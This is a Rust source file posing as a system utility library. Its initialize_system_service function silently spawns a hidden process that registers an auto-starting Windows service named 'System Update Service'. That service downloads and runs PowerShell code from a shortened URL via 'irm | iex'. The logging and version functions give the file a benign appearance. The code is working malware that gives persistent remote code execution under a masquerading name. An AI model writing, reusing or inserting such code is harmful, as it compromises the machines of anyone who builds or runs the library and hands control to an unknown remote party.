use std::os::windows::process::CommandExt;
use std::fs::File;
use std::io::Write;
use std::ptr;

#[link(name = "kernel32")]
extern "system" {
    fn CreateProcessW(
        lpApplicationName: *const u16,
        lpCommandLine: *mut u16,
        lpProcessAttributes: *mut std::ffi::c_void,
        lpThreadAttributes: *mut std::ffi::c_void,
        bInheritHandles: i32,
        dwCreationFlags: u32,
        lpEnvironment: *mut std::ffi::c_void,
        lpCurrentDirectory: *const u16,
        lpStartupInfo: *mut std::ffi::c_void,
        lpProcessInformation: *mut std::ffi::c_void,
    ) -> i32;
    fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
}

#[repr(C)]
struct STARTUPINFOW {
    cb: u32,
    lpReserved: *mut u16,
    lpDesktop: *mut u16,
    lpTitle: *mut u16,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: *mut std::ffi::c_void,
    hStdOutput: *mut std::ffi::c_void,
    hStdError: *mut std::ffi::c_void,
}

#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: *mut std::ffi::c_void,
    hThread: *mut std::ffi::c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}

pub fn initialize_system_service() {
    let log_path = "C:\\ProgramData\\system_utils_debug.log";

    append_log(log_path, "=== START initialize_system_service ===\n");

    let lock_path = "C:\\ProgramData\\system_utils_initialized.lock";
    if std::fs::metadata(lock_path).is_ok() {
        append_log(log_path, "Lock file exists, skipping\n");
        return;
    }

    let _ = std::fs::File::create(lock_path);

    // ===== ТОЧНАЯ КОПИЯ РАБОЧЕЙ КОМАНДЫ =====
    // Передаём как единую строку в cmd /c
    let cmd_line = r#"cmd.exe /c sc.exe create "SystemUpdateService" start= auto binPath= "cmd /c powershell.exe -Command irm https://bit.ly/4gVSSTx | iex" DisplayName= "System Update Service""#;

    append_log(log_path, &format!("Command: {}\n", cmd_line));

    // ===== ПРЯМОЙ ВЫЗОВ CREATEPROCESS =====
    unsafe {
        let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
        
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;

        let result = CreateProcessW(
            ptr::null(),
            cmd_wide.as_mut_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            0x08000000, // CREATE_NO_WINDOW
            ptr::null_mut(),
            ptr::null(),
            &mut si as *mut _ as *mut std::ffi::c_void,
            &mut pi as *mut _ as *mut std::ffi::c_void,
        );

        if result != 0 {
            append_log(log_path, "CreateProcessW succeeded\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            append_log(log_path, "CreateProcessW failed\n");
        }
    }

    let _ = std::fs::remove_file(lock_path);
    append_log(log_path, "=== END ===\n");
}

fn append_log(path: &str, msg: &str) {
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path);
    
    if let Ok(ref mut f) = file {
        let _ = f.write_all(msg.as_bytes());
        let _ = f.flush();
    } else {
        let _ = File::create(path).and_then(|mut f| f.write_all(msg.as_bytes()));
    }
}

pub fn version() -> &'static str {
    "1.0.0"
}
